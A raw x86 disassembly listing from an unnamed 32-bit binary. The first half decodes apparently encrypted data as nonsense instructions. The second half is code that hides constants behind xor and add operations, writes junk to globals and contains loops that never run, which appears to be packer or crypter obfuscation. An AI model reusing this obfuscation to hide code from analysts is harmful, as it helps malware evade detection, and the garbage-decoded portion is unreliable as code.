  40cd04:	mov    eax,0xccd0d0bd
  40cd09:	loopne 0x40cd07
  40cd0b:	cmc    
  40cd0c:	aam    0xc4
  40cd0e:	cli    
  40cd0f:	aam    0xed
  40cd11:	in     eax,0x1
  40cd13:	psubsb mm1,mm3
  40cd16:	repz div ebp
  40cd19:	mov    cl,0xbc
  40cd1b:	out    dx,eax
  40cd1c:	jmp    0x40cceb
  40cd1e:	scas   al,BYTE PTR es:[edi]
  40cd1f:	retf   0xcde4
  40cd22:	mov    dl,0xf0
  40cd24:	xlat   BYTE PTR ds:[ebx]
  40cd25:	loop   0x40cd01
  40cd27:	mov    esi,0xc4fd01c0
  40cd2c:	add    bl,cl
  40cd2e:	or     eax,ebx
  40cd30:	out    0x5,al
  40cd32:	push   cs
  40cd33:	cli    
  40cd34:	stc    
  40cd35:	shl    edx,cl
  40cd37:	loope  0x40ccf0
  40cd39:	mov    dl,0xeb
  40cd3b:	cmc    
  40cd3c:	out    0xe7,al
  40cd3e:	mov    al,0xb4
  40cd40:	mov    ch,0xd5
  40cd42:	mov    esp,0xded3db02
  40cd47:	out    dx,al
  40cd48:	hlt    
  40cd49:	push   es
  40cd4a:	rcl    ebx,0xe6
  40cd4d:	cmc    
  40cd4e:	std    
  40cd4f:	fcmovnu st,st(3)
  40cd51:	(bad)  
  40cd53:	cld    
  40cd54:	add    dh,BYTE PTR [ebx-0x3d36281e]
  40cd5a:	mov    bl,0xd4
  40cd5c:	hlt    
  40cd5d:	mov    ch,0xb1
  40cd5f:	in     al,0xf2
  40cd61:	retf   0xefd2
  40cd64:	leave  
  40cd65:	mul    al
  40cd67:	mov    ch,0xc2
  40cd69:	stc    
  40cd6a:	fild   WORD PTR [eax]
  40cd6c:	sar    esp,0xe1
  40cd6f:	or     ch,ah
  40cd71:	(bad)  
  40cd73:	add    eax,DWORD PTR [edx]
  40cd75:	mov    bl,0xad
  40cd77:	les    esi,FWORD PTR [edx-0x813121c]
  40cd7d:	retf   
  40cd7e:	sti    
  40cd7f:	retf   
  40cd80:	retf   
  40cd81:	in     al,dx
  40cd82:	fcmovbe st,st(1)
  40cd84:	fdiv   st,st(6)
  40cd86:	std    
  40cd87:	mov    ebp,0xfde0ffb8
  40cd8c:	loope  0x40cd51
  40cd8e:	xlat   BYTE PTR ds:[ebx]
  40cd8f:	add    eax,0xedecad8
  40cd94:	add    al,0xd0
  40cd96:	ror    edx,1
  40cd98:	lods   eax,DWORD PTR ds:[esi]
  40cd99:	rol    ebp,cl
  40cd9b:	int3   
  40cd9c:	rcr    cl,cl
  40cd9e:	jmp    0xdaffc99e
  40cda3:	repnz inc dl
  40cda6:	add    bl,dh
  40cda8:	pop    es
  40cda9:	add    BYTE PTR [ebp-0x39ff0b2d],bh
  40cdaf:	(bad)  
  40cdb0:	fcmovne st,st(2)
  40cdb2:	in     eax,0xdf
  40cdb4:	cld    
  40cdb5:	scas   eax,DWORD PTR es:[edi]
  40cdb6:	fucomp st(3)
  40cdb8:	cmc    
  40cdb9:	mov    al,0xac
  40cdbb:	int    0xea
  40cdbd:	fsub   st,st(0)
  40cdbf:	out    dx,al
  40cdc0:	mov    bh,0xd3
  40cdc2:	jmp    0xf8fa7e93
  40cdc7:	call   ebp
  40cdc9:	(bad)  
  40cdca:	(bad)  
  40cdcc:	add    al,0xe1
  40cdce:	or     esp,ebp
  40cdd0:	(bad)  
  40cdd1:	loopne 0x40cdb8
  40cdd3:	(bad)  
  40cdd5:	(bad)
  40cdd8:	(bad)  
  40cdda:	imul   ebx
  40cddc:	jmp    0xed2682d3
  40cde1:	sar    DWORD PTR [ecx-0x43082d3d],1
  40cde7:	stc    
  40cde8:	loopne 0x40cddc
  40cdea:	jecxz  0x40cdae
  40cdec:	sti    
  40cded:	or     ch,dl
  40cdef:	clc    
  40cdf0:	(bad)
  40cdf3:	(bad)
  40cdf6:	int    0xb0
  40cdf8:	into   
  40cdf9:	iret   
  40cdfa:	call   0xc73c94c5
  40cdff:	mov    ebx,0xc8cacecf
  40ce04:	jecxz  0x40ce08
  40ce06:	(bad)  
  40ce08:	(bad)  
  40ce09:	in     al,0xdb
  40ce0b:	std    
  40ce0c:	add    al,0xe6
  40ce0e:	jmp    0x2fa:0xc4d8e0db
  40ce15:	mov    ecx,0xcae4e0f1
  40ce1a:	shl    bl,cl
  40ce1c:	repz shl ebp,cl
  40ce1f:	retf   0xdec6
  40ce22:	mov    ebp,0xbadbe9
  40ce27:	clc    
  40ce28:	not    ebx
  40ce2a:	add    bh,dl
  40ce2c:	cld    
  40ce2d:	xlat   BYTE PTR ds:[ebx]
  40ce2e:	add    al,0xdd
  40ce30:	fldlg2 
  40ce32:	jmp    0xe4a9:0xeebfd813
  40ce39:	aam    0xc9
  40ce3b:	jmp    0x40ce27
  40ce3d:	idiv   ecx
  40ce3f:	mov    edi,0xd6e4e8ef
  40ce44:	loope  0x40ce47
  40ce46:	aad    0xc3
  40ce48:	add    bh,dh
  40ce4a:	(bad)  
  40ce4b:	(bad)  
  40ce4d:	fdivr  st,st(1)
  40ce4f:	jmp    0xaf05:0x70809e8
  40ce56:	in     al,dx
  40ce57:	(bad)  
  40ce58:	into   
  40ce59:	(bad)  
  40ce5a:	loop   0x40ce4e
  40ce5c:	fidivr DWORD PTR [ebx-0x3428163a]
  40ce62:	(bad)  
  40ce63:	icebp  
  40ce64:	fnop   
  40ce66:	jecxz  0x40ce21
  40ce68:	(bad)  
  40ce69:	loop   0x40ce5f
  40ce6b:	std    
  40ce6c:	(bad)  
  40ce6d:	aam    0xd6
  40ce6f:	add    eax,0xef08d50b
  40ce74:	frstor [edi-0x4d13231e]
  40ce7a:	out    0xea,eax
  40ce7c:	(bad)
  40ce7f:	aam    0xce
  40ce81:	shl    dh,cl
  40ce83:	ret    
  40ce84:	lock repnz test esp,0xc2e5cdf5
  40ce8c:	add    ebx,ebx
  40ce8e:	in     al,0x8
  40ce90:	out    0xe8,eax
  40ce92:	pop    es
  40ce93:	cli    
  40ce94:	out    0xeb,al
  40ce96:	out    0xe6,eax
  40ce98:	leave  
  40ce99:	out    dx,al
  40ce9a:	(bad)  
  40ce9b:	int    0xd2
  40ce9d:	mov    bl,0xce
  40ce9f:	in     al,dx
  40cea0:	sar    ebx,1
  40cea2:	fdiv   st(0),st
  40cea4:	xlat   BYTE PTR ds:[ebx]
  40cea5:	loope  0x40cea1
  40cea7:	repnz clc 
  40cea9:	aad    0xd2
  40ceab:	idiv   al
  40cead:	(bad)  
  40ceae:	(bad)  
  40ceb0:	(bad)  
  40ceb1:	out    dx,eax
  40ceb2:	push   cs
  40ceb3:	jecxz  0x40ce9c
  40ceb5:	f2xm1  
  40ceb7:	mov    edi,0xfbacc7c0
  40cebc:	aad    0xb5
  40cebe:	clc    
  40cebf:	hlt    
  40cec0:	std    
  40cec1:	repz lock out dx,al
  40cec4:	fxch   st(4)
  40cec6:	fsub   st(6),st
  40cec8:	ret    0xd2f7
  40cecb:	lock (bad) 
  40cece:	fcmovnu st,st(0)
  40ced0:	cld    
  40ced1:	(bad)  
  40ced2:	fxam   
  40ced4:	cld    
  40ced5:	lods   al,BYTE PTR ds:[esi]
  40ced6:	mov    ebp,0xf1d0f1de
  40cedb:	in     al,0xef
  40cedd:	(bad)  
  40cede:	lock repz sti 
  40cee1:	in     eax,dx
  40cee2:	retf   0xbfce
  40cee5:	shl    bl,1
  40cee7:	push   esp
  40cee9:	mov    ebp,0xc6dbf6fc
  40ceee:	jmp    0x40c:0xf03deda
  40cef5:	lods   al,BYTE PTR ds:[esi]
  40cef6:	int3   
  40cef7:	out    dx,eax
  40cef8:	(bad)  
  40cef9:	shl    bl,cl
  40cefb:	cmc    
  40cefc:	repz cmc 
  40cefe:	mov    al,0xea
  40cf00:	idiv   ebx
  40cf02:	jecxz  0x40cefb
  40cf04:	mov    edi,0x2f7d8d7
  40cf09:	sar    ch,0xf7
  40cf0c:	in     eax,0x3
  40cf0e:	(bad)  
  40cf10:	(bad)  
  40cf12:	dec    DWORD PTR [edi]
  40cf14:	iret   
  40cf15:	test   al,0xea
  40cf17:	lock loope 0x40ceff
  40cf1a:	out    dx,eax
  40cf1b:	leave  
  40cf1c:	mov    ah,0xf4
  40cf1e:	int3   
  40cf1f:	(bad)  
  40cf20:	mov    eax,0xbef4b8bd
  40cf25:	rcl    ebx,1
  40cf27:	mov    ecx,0xc2c4d2ce
  40cf2c:	fmul   QWORD PTR [eax]
  40cf2e:	in     eax,0xf8
  40cf30:	out    0xdb,al
  40cf32:	out    0xdd,eax
  40cf34:	fdivr  QWORD PTR [ebp-0x4c282956]
  40cf3a:	retf   
  40cf3b:	sar    BYTE PTR [ebx-0x2d041b46],0xfb
  40cf42:	std    
  40cf43:	jmp    0xfb2fcf2a
  40cf48:	neg    esp
  40cf4a:	(bad)  
  40cf4c:	add    al,0xde
  40cf4e:	fsub   st(2),st
  40cf50:	vpaddusb ymm1,ymm5,YMMWORD PTR [ebx]
  40cf54:	clc    
  40cf55:	loope  0x40cf39
  40cf57:	iret   
  40cf58:	(bad)  
  40cf59:	iret   
  40cf5a:	mov    ah,0xc2
  40cf5c:	cli    
  40cf5d:	sti    
  40cf5e:	mov    ecx,0xfdd7f8d9
  40cf63:	jmp    0xf2308e32
  40cf68:	push   es
  40cf69:	mov    edi,0xebfff0
  40cf6e:	stc    
  40cf6f:	out    dx,al
  40cf70:	fimul  DWORD PTR [edx]
  40cf72:	add    dh,ah
  40cf74:	pop    es
  40cf75:	leave  
  40cf76:	retf   
  40cf77:	repz mov cl,0xe0
  40cf7a:	mov    cl,0xd4
  40cf7c:	loope  0x40cf57
  40cf7e:	(bad)  
  40cf80:	repz retf 
  40cf82:	sti    
  40cf83:	mov    ecx,0xccfdfe01
  40cf88:	fadd   st,st(2)
  40cf8a:	sti    
  40cf8b:	loop   0x40cf6d
  40cf8d:	in     eax,0xd7
  40cf8f:	call   0xd347bb7b
  40cf94:	in     eax,0xeb
  40cf96:	mov    eax,0xdbf6c3cd
  40cf9b:	enter  0xb2c4,0xc6
  40cf9f:	mov    eax,0xf8dcd6be
  40cfa4:	cld    
  40cfa5:	fptan  
  40cfa7:	mov    ecx,0xdb02d905
  40cfad:	retf   
  40cfae:	jmp    0xc62a987b
  40cfb3:	clc    
  40cfb4:	jmp    0x40cf8f
  40cfb6:	(bad)  
  40cfb7:	test   al,0xf6
  40cfb9:	jmp    0xadb6:0xc9cbc7d7
  40cfc0:	leave  
  40cfc1:	aad    0xb6
  40cfc3:	fiadd  WORD PTR [edx]
  40cfc5:	fistp  QWORD PTR [eax-0x18072008]
  40cfcb:	clc    
  40cfcc:	fdiv   st(7),st
  40cfce:	mul    esp
  40cfd0:	test   ch,0xe3
  40cfd3:	fsubr  st(7),st
  40cfd5:	loopne 0x40cfa4
  40cfd7:	vshufps xmm4,xmm3,xmm2,0xcd
  40cfdc:	mov    al,0xcf
  40cfde:	test   esp,0xeff7e8ea
  40cfe4:	cld    
  40cfe5:	mov    ecx,0xc3d9f5d6
  40cfea:	in     al,0x5
  40cfec:	jmp    0xdb4494b1
  40cff1:	stc    
  40cff2:	int    0xd3
  40cff4:	out    dx,al
  40cff5:	fadd   st(3),st
  40cff7:	fmulp  st(5),st
  40cff9:	repz jecxz 0x40cfbc
  40cffc:	mov    ah,0xf3
  40cffe:	out    dx,eax
  40cfff:	icebp  
  40d000:	mov    ch,0xc4
  40d002:	iret   
  40d003:	repz rcr ebp,cl
  40d006:	fidivr WORD PTR [ebp-0x2afb2d2c]
  40d00c:	(bad)  [edx]
  40d00e:	ret    0xe7f9
  40d011:	add    al,0x3
  40d013:	cld    
  40d014:	std    
  40d015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d016:	in     al,dx
  40d017:	mov    esp,0xefc3b7e2
  40d01c:	jmp    0xbf2787ed
  40d021:	shl    edx,cl
  40d023:	add    edi,edi
  40d025:	(bad)  
  40d026:	shl    eax,cl
  40d028:	call   eax
  40d02a:	pop    es
  40d02b:	add    edi,ebp
  40d02d:	add    eax,0xe3fcbdd9
  40d032:	jmp    0xe0d6:0xbce809fb
  40d039:	mov    bh,0xaa
  40d03b:	in     al,0xd1
  40d03d:	fcmovbe st,st(6)
  40d03f:	fstp   TBYTE PTR [eax-0x47323b12]
  40d045:	int3   
  40d046:	cli    
  40d047:	cli    
  40d048:	stc    
  40d049:	mul    ecx
  40d04b:	fild   DWORD PTR [eax]
  40d04d:	lock dec edi
  40d050:	(bad)  
  40d051:	(bad)  
  40d052:	hlt    
  40d053:	retf   
  40d054:	add    cl,ch
  40d056:	leave  
  40d057:	int    0xb2
  40d059:	mov    ebp,0xc8fbead7
  40d05e:	scas   al,BYTE PTR es:[edi]
  40d05f:	out    0xff,eax
  40d061:	into   
  40d062:	jmp    0x40d041
  40d064:	fptan  
  40d066:	cli    
  40d067:	in     eax,dx
  40d068:	add    cl,al
  40d06a:	out    0xf7,eax
  40d06c:	div    ah
  40d06e:	sar    edx,0xdb
  40d071:	out    0xe2,al
  40d073:	or     ebp,ebp
  40d075:	ror    esp,cl
  40d077:	ret    0xadd2
  40d07a:	repz retf 
  40d07c:	jmp    0xf2f6:0xd0b6edc8
  40d083:	cmc    
  40d084:	stc    
  40d085:	mov    ecx,0x5ccbff4
  40d08a:	mul    ah
  40d08c:	fcmovne st,st(2)
  40d08e:	push   es
  40d08f:	or     bh,ch
  40d091:	retf   0x50c
  40d094:	call   0xf7269a8a
  40d099:	scas   al,BYTE PTR es:[edi]
  40d09a:	rol    dl,0xce
  40d09d:	int    0xf9
  40d09f:	call   0xf7059f8a
  40d0a4:	mov    esi,0xf5ddedf4
  40d0a9:	lock add esp,esp
  40d0ac:	jmp    0x6309ca6
  40d0b1:	fsub   st(6),st
  40d0b3:	pop    es
  40d0b4:	repnz scas eax,DWORD PTR es:[edi]
  40d0b6:	jmp    0xe4f68fa9
  40d0bb:	jmp    0xb21c8284
  40d0c0:	iret   
  40d0c1:	mov    ah,0xd0
  40d0c3:	hlt    
  40d0c4:	repz ret 
  40d0c6:	in     al,dx
  40d0c7:	mov    eax,0xdb0402d5
  40d0cc:	or     ebx,esp
  40d0ce:	cli    
  40d0cf:	(bad)  
  40d0d0:	push   es
  40d0d1:	hlt    
  40d0d2:	jmp    0xa9eccbc9
  40d0d7:	retf   
  40d0d8:	mov    ebp,0xf4c3cfc7
  40d0dd:	fdivr  st,st(3)
  40d0df:	(bad)  
  40d0e0:	in     al,dx
  40d0e1:	iret   
  40d0e2:	fcomp  st(2)
  40d0e4:	mov    ebx,0xd2f1f5
  40d0e9:	stc    
  40d0ea:	loopne 0x40d0c0
  40d0ec:	sar    ecx,1
  40d0ee:	rol    BYTE PTR [esi],0xff
  40d0f1:	cmc    
  40d0f2:	out    dx,al
  40d0f3:	int3   
  40d0f4:	bnd ret 0xedea
  40d0f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0f9:	aad    0xe1
  40d0fb:	mov    ch,0xc7
  40d0fd:	shl    bh,cl
  40d0ff:	fcomi  st,st(6)
  40d101:	(bad)  
  40d102:	cmc    
  40d103:	jmp    0xd23ecbe7
  40d108:	int    0xf0
  40d10a:	fcomi  st,st(6)
  40d10c:	add    BYTE PTR [eax+eax*1],al
  40d10f:	clc    
  40d110:	loopne 0x40d0d5
  40d112:	(bad)  
  40d114:	in     al,dx
  40d115:	(bad)  
  40d116:	lock in al,0xcd
  40d119:	enter  0xb6ee,0xca
  40d11d:	int3   
  40d11e:	aam    0xd4
  40d120:	mov    eax,0xc8ccc4cb
  40d125:	int3   
  40d126:	hlt    
  40d127:	int3   
  40d128:	mov    eax,0xd1e404db
  40d12d:	std    
  40d12e:	jmp    0x40d13f
  40d130:	jecxz  0x40d13f
  40d132:	pop    es
  40d133:	out    dx,al
  40d134:	int    0xc6
  40d136:	jmp    0x40d129
  40d138:	loop   0x40d0f7
  40d13a:	div    bh
  40d13c:	xlat   BYTE PTR ds:[ebx]
  40d13d:	retf   
  40d13e:	sar    BYTE PTR [ebx-0x31034745],cl
  40d144:	mov    ecx,0xe2c2b8c8
  40d149:	icebp  
  40d14a:	repz push es
  40d14c:	icebp  
  40d14d:	retf   
  40d14e:	out    0xe4,al
  40d150:	(bad)  
  40d151:	int    0xc4
  40d153:	jmp    0xacb2:0xd7f2d9d8
  40d15a:	rol    dh,cl
  40d15c:	mov    dl,0xd1
  40d15e:	(bad)  
  40d160:	jmp    0x40d135
  40d162:	int3   
  40d163:	loop   0x40d13f
  40d165:	(bad)  
  40d167:	not    dh
  40d169:	add    ebp,edi
  40d16b:	(bad)  
  40d16d:	add    edx,eax
  40d16f:	(bad)
  40d173:	retf   
  40d174:	jmp    0x40d139
  40d176:	mov    eax,0xb0e1eace
  40d17b:	(bad)  
  40d17c:	mov    cl,0xbb
  40d17e:	mov    ecx,0xced0d7c4
  40d183:	call   0xd2009a76
  40d188:	sar    edx,cl
  40d18a:	mov    ebp,0x40bebe3
  40d18f:	std    
  40d190:	shr    al,0xc4
  40d193:	add    eax,0xefe9a8fc
  40d198:	(bad)  
  40d199:	call   0xce27b587
  40d19e:	clc    
  40d19f:	in     al,dx
  40d1a0:	(bad)
  40d1a3:	stc    
  40d1a4:	(bad)  
  40d1a6:	fdiv   st,st(4)
  40d1a8:	(bad)  
  40d1aa:	add    ebx,edx
  40d1ac:	sar    BYTE PTR [edi+0xf0606e3],0xdd
  40d1b3:	jmp    0x40d1b7
  40d1b5:	lock loope 0x40d17b
  40d1b8:	mov    ebp,0xf7adaae8
  40d1bd:	mov    edx,0xcec9fbc5
  40d1c2:	mov    ch,0x2
  40d1c4:	fcomi  st,st(3)
  40d1c6:	shr    esp,cl
  40d1c8:	mov    esi,0xd1e1e3bf
  40d1cd:	out    0xe0,al
  40d1cf:	std    
  40d1d0:	dec    edi
  40d1d2:	int3   
  40d1d3:	out    0xe3,al
  40d1d5:	int    0xb1
  40d1d7:	sar    DWORD PTR [ebp-0x16052c1b],0xf7
  40d1de:	(bad)  
  40d1df:	fdivr  st,st(7)
  40d1e1:	(bad)  
  40d1e2:	cld    
  40d1e3:	mov    cl,0xca
  40d1e5:	ret    0xf7ec
  40d1e8:	ret    0x4fc
  40d1eb:	aad    0xfe
  40d1ed:	(bad)  
  40d1ee:	out    dx,eax
  40d1ef:	(bad)  
  40d1f0:	push   cs
  40d1f1:	int    0xca
  40d1f3:	(bad)
  40d1f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1f7:	rol    ah,0xd6
  40d1fa:	hlt    
  40d1fb:	mov    cl,0xce
  40d1fd:	shr    ah,cl
  40d1ff:	in     al,0xb5
  40d201:	lock mov ecx,0xd1d7d8ff
  40d207:	rcr    bl,1
  40d209:	add    edi,esp
  40d20b:	hlt    
  40d20c:	sar    cl,cl
  40d20e:	(bad)  
  40d20f:	std    
  40d210:	pop    es
  40d211:	add    BYTE PTR [eax],cl
  40d213:	int    0xe5
  40d215:	shl    edi,0xf3
  40d218:	rol    cl,cl
  40d21a:	div    DWORD PTR [edx-0x30193439]
  40d220:	call   0xb4f29ced
  40d225:	mov    esi,0xfffd06ec
  40d22a:	add    eax,0x5424137
  40d22f:	adc    ecx,0x0
  40d232:	mov    ecx,DWORD PTR [ebp-0x4]
  40d235:	mov    ecx,DWORD PTR [ecx]
  40d237:	xor    ecx,eax
  40d239:	mov    eax,DWORD PTR [ebp-0x4]
  40d23c:	mov    DWORD PTR [eax],ecx
  40d23e:	mov    eax,DWORD PTR [ebp+0x14]
  40d241:	mov    eax,DWORD PTR [eax]
  40d243:	mov    DWORD PTR [ebp-0x38],eax
  40d246:	mov    eax,DWORD PTR [ebp-0x38]
  40d249:	mov    eax,DWORD PTR [eax]
  40d24b:	mov    ecx,DWORD PTR [ebp-0x4]
  40d24e:	mov    ecx,DWORD PTR [ecx]
  40d250:	xor    edx,edx
  40d252:	sub    ecx,0x5424137
  40d258:	sbb    edx,0x0
  40d25b:	xor    ecx,0x8a29a14b
  40d261:	xor    edx,0x0
  40d264:	xor    ecx,0x8a29a14b
  40d26a:	xor    edx,0x0
  40d26d:	add    ecx,0x5424137
  40d273:	adc    edx,0x0
  40d276:	mov    eax,DWORD PTR [eax]
  40d278:	xor    esi,esi
  40d27a:	add    eax,ecx
  40d27c:	adc    esi,edx
  40d27e:	mov    ecx,DWORD PTR [ebp-0x38]
  40d281:	mov    ecx,DWORD PTR [ecx]
  40d283:	mov    DWORD PTR [ecx],eax
  40d285:	mov    eax,DWORD PTR [ebp-0xc]
  40d288:	mov    DWORD PTR [eax],0x70941f81
  40d28e:	mov    DWORD PTR [eax+0x4],0xffffffff
  40d295:	mov    eax,DWORD PTR [ebp-0x18]
  40d298:	mov    ecx,DWORD PTR [ebp-0x14]
  40d29b:	mov    DWORD PTR [ebp-0x40],eax
  40d29e:	mov    DWORD PTR [ebp-0x3c],ecx
  40d2a1:	cmp    DWORD PTR [ebp-0x40],0x70941f81
  40d2a8:	jne    0x40d342
  40d2ae:	cmp    DWORD PTR [ebp-0x3c],0xffffffff
  40d2b2:	jne    0x40d342
  40d2b8:	mov    eax,DWORD PTR [ebp-0x4]
  40d2bb:	mov    eax,DWORD PTR [eax]
  40d2bd:	xor    ecx,ecx
  40d2bf:	sub    eax,0x5424137
  40d2c4:	sbb    ecx,0x0
  40d2c7:	xor    eax,0x8a29a14b
  40d2cc:	xor    ecx,0x0
  40d2cf:	mov    edx,DWORD PTR [ebp+0x8]
  40d2d2:	xor    edx,0x75108b5
  40d2d8:	add    edx,0x3272fb
  40d2de:	xor    esi,esi
  40d2e0:	sub    edx,0x5424137
  40d2e6:	sbb    esi,0x0
  40d2e9:	xor    edx,0x8a29a14b
  40d2ef:	xor    esi,0x0
  40d2f2:	mov    DWORD PTR [ebp-0x48],eax
  40d2f5:	mov    DWORD PTR [ebp-0x44],ecx
  40d2f8:	mov    DWORD PTR [ebp-0x50],edx
  40d2fb:	mov    DWORD PTR [ebp-0x4c],esi
  40d2fe:	mov    eax,DWORD PTR [ebp-0x48]
  40d301:	cmp    eax,DWORD PTR [ebp-0x50]
  40d304:	jne    0x40d342
  40d30a:	mov    eax,DWORD PTR [ebp-0x44]
  40d30d:	cmp    eax,DWORD PTR [ebp-0x4c]
  40d310:	jne    0x40d342
  40d316:	mov    eax,DWORD PTR [ebp-0x4]
  40d319:	mov    eax,DWORD PTR [eax]
  40d31b:	xor    ecx,ecx
  40d31d:	sub    eax,0x5424137
  40d322:	sbb    ecx,0x0
  40d325:	xor    eax,0x8a29a14b
  40d32a:	xor    ecx,0x0
  40d32d:	xor    eax,0x8a29a14b
  40d332:	xor    ecx,0x0
  40d335:	add    eax,0x5424137
  40d33a:	adc    ecx,0x0
  40d33d:	mov    ecx,DWORD PTR [ebp-0x8]
  40d340:	mov    DWORD PTR [ecx],eax
  40d342:	pop    esi
  40d343:	leave  
  40d344:	ret    0x10
  40d347:	push   ebp
  40d348:	mov    ebp,esp
  40d34a:	sub    esp,0x144
  40d350:	sub    DWORD PTR ds:0x437723,0x4cfe
  40d35a:	push   ebx
  40d35b:	or     eax,DWORD PTR ds:0x437783
  40d361:	push   esi
  40d362:	mov    DWORD PTR [ebp-0x3c],0xf89c85b0
  40d369:	or     eax,0x788f
  40d36e:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  40d375:	mov    eax,DWORD PTR [ebp-0x3c]
  40d378:	xor    eax,0x75108b5
  40d37d:	mov    DWORD PTR ds:0x437727,0x3e42
  40d387:	add    eax,0x3272fb
  40d38c:	mov    DWORD PTR [ebp-0x28],eax
  40d38f:	cmp    DWORD PTR [ebp+0x14],0x0
  40d393:	mov    DWORD PTR ds:0x4377a3,0x7433
  40d39d:	je     0x40d3c5
  40d3a3:	adc    DWORD PTR ds:0x437743,ebx
  40d3a9:	mov    eax,DWORD PTR [ebp+0x14]
  40d3ac:	adc    DWORD PTR ds:0x437777,0x7bf4
  40d3b6:	mov    eax,DWORD PTR [eax]
  40d3b8:	mov    DWORD PTR ds:0x437753,0x6d3d
  40d3c2:	mov    DWORD PTR [ebp-0x28],eax
  40d3c5:	dec    DWORD PTR ds:0x43775f
  40d3cb:	mov    eax,DWORD PTR [ebp-0x3c]
  40d3ce:	sbb    DWORD PTR ds:0x437783,0x437787
  40d3d8:	xor    eax,0x75108b5
  40d3dd:	adc    DWORD PTR ds:0x437767,0x43775f
  40d3e7:	add    eax,0x3272fb
  40d3ec:	mov    DWORD PTR [ebp-0x2c],eax
  40d3ef:	sub    DWORD PTR ds:0x43774f,edx
  40d3f5:	mov    eax,DWORD PTR [ebp-0x40]
  40d3f8:	or     DWORD PTR ds:0x43778f,0x43774b
  40d402:	xor    eax,0x75108b5
  40d407:	add    DWORD PTR ds:0x43772f,0x43771f
  40d411:	add    eax,0x3272fb
  40d416:	adc    DWORD PTR ds:0x4377a3,0x39ac
  40d420:	mov    DWORD PTR [ebp-0x4],eax
  40d423:	sub    DWORD PTR ds:0x437743,0x27b7
  40d42d:	mov    eax,DWORD PTR [ebp-0x3c]
  40d430:	sbb    DWORD PTR ds:0x4377a7,0x43779f
  40d43a:	xor    eax,0x75108b5
  40d43f:	add    eax,0x3272fb
  40d444:	mov    DWORD PTR [ebp-0x8],eax
  40d447:	movzx  eax,BYTE PTR ds:0x43779b
  40d44e:	xor    DWORD PTR ds:0x437753,eax
  40d454:	mov    eax,DWORD PTR [ebp-0x3c]
  40d457:	xor    eax,0x75108b5
  40d45c:	add    eax,0x3272fb
  40d461:	mov    DWORD PTR ds:0x437723,0x519f
  40d46b:	mov    DWORD PTR [ebp-0x44],eax
  40d46e:	jmp    0x40d503
  40d473:	mov    eax,DWORD PTR [ebp-0x40]
  40d476:	xor    eax,0x75108b5
  40d47b:	mov    DWORD PTR ds:0x437737,0x12
  40d485:	cmp    DWORD PTR ds:0x437737,0x0
  40d48c:	je     0x40d4e4
  40d492:	cmp    DWORD PTR ds:0x437737,0x2
  40d499:	jb     0x40d4e4
  40d49f:	jmp    0x40d4b8
  40d4a4:	push   DWORD PTR [ebp-0x14]
  40d4a7:	push   DWORD PTR [ebp-0x14]
  40d4aa:	push   0x43776f
  40d4af:	push   DWORD PTR [ebp-0x14]
  40d4b2:	call   DWORD PTR ds:0x43c99c
  40d4b8:	cmp    DWORD PTR ds:0x437737,0x3
  40d4bf:	jne    0x40d4d2
  40d4c5:	mov    ecx,DWORD PTR ds:0x437737
  40d4cb:	dec    ecx
  40d4cc:	mov    DWORD PTR ds:0x437737,ecx
  40d4d2:	mov    ecx,DWORD PTR ds:0x437737
  40d4d8:	dec    ecx
  40d4d9:	mov    DWORD PTR ds:0x437737,ecx
  40d4df:	jmp    0x40d485
  40d4e4:	mov    ecx,DWORD PTR [ebp-0x44]
  40d4e7:	lea    eax,[ecx+eax*1+0x3272fb]
  40d4ee:	mov    ecx,DWORD PTR ds:0x43771b
  40d4f4:	sub    ecx,DWORD PTR ds:0x43779f
  40d4fa:	mov    DWORD PTR ds:0x43771b,ecx
  40d500:	mov    DWORD PTR [ebp-0x44],eax
  40d503:	and    DWORD PTR ds:0x4377bb,0x0
  40d50d:	jmp    0x40d521
  40d512:	xor    ecx,ecx
  40d514:	or     ecx,DWORD PTR ds:0x4377bb
  40d51a:	inc    ecx
  40d51b:	mov    DWORD PTR ds:0x4377bb,ecx
  40d521:	cmp    DWORD PTR ds:0x4377bb,0x1b
  40d528:	jae    0x40d57e
  40d52e:	cmp    DWORD PTR ds:0x4377bb,0x9
  40d535:	jb     0x40d57e
  40d53b:	jmp    0x40d55f
  40d540:	push   0x407a
  40d545:	push   0x6d74
  40d54a:	push   0x48da
  40d54f:	push   0x6ac6
  40d554:	push   0x6e05
  40d559:	call   DWORD PTR ds:0x43c9a0
  40d55f:	cmp    DWORD PTR ds:0x4377bb,0x8
  40d566:	jne    0x40d579
  40d56c:	mov    ecx,DWORD PTR ds:0x4377bb
  40d572:	inc    ecx
  40d573:	mov    DWORD PTR ds:0x4377bb,ecx
  40d579:	jmp    0x40d512
  40d57e:	mov    eax,DWORD PTR [ebp-0x44]
  40d581:	and    DWORD PTR ds:0x437777,0x0
  40d58b:	xor    ecx,ecx
  40d58d:	xor    ecx,DWORD PTR ds:0x437777
  40d593:	inc    ecx
  40d594:	mov    DWORD PTR ds:0x437777,ecx
  40d59a:	cmp    DWORD PTR ds:0x437777,0x1b
  40d5a1:	jb     0x40d5c9
  40d5a7:	jmp    0x40d5bc
  40d5ac:	push   0x80b4
  40d5b1:	push   0x2f38
  40d5b6:	call   DWORD PTR ds:0x43c9a4
  40d5bc:	cmp    DWORD PTR ds:0x437777,0x13
  40d5c3:	jb     0x40d58b
  40d5c9:	sub    eax,0x3272fb
  40d5ce:	sbb    DWORD PTR ds:0x43776f,edx
  40d5d4:	xor    eax,0x75108b5
  40d5d9:	sbb    ecx,DWORD PTR ds:0x43775b
  40d5df:	mov    ecx,DWORD PTR [ebp-0x4]
  40d5e2:	sub    ecx,0x3272fb
  40d5e8:	sbb    DWORD PTR ds:0x4377b3,0x1661
  40d5f2:	xor    ecx,0x75108b5
  40d5f8:	mov    DWORD PTR ds:0x437723,0x6ceb
  40d602:	cmp    eax,ecx
  40d604:	mov    DWORD PTR ds:0x43770f,0xe30
  40d60e:	je     0x4125fe
  40d614:	mov    eax,DWORD PTR [ebp-0x3c]
  40d617:	xor    eax,0x75108b5
  40d61c:	add    eax,0x3272fb
  40d621:	cmp    DWORD PTR [ebp-0x44],eax
  40d624:	mov    DWORD PTR ds:0x43778b,0x71e8
  40d62e:	jne    0x40de86
  40d634:	mov    DWORD PTR ds:0x437783,0x16
  40d63e:	cmp    DWORD PTR ds:0x437783,0x0
  40d645:	je     0x40d696
  40d64b:	cmp    DWORD PTR ds:0x437783,0x4
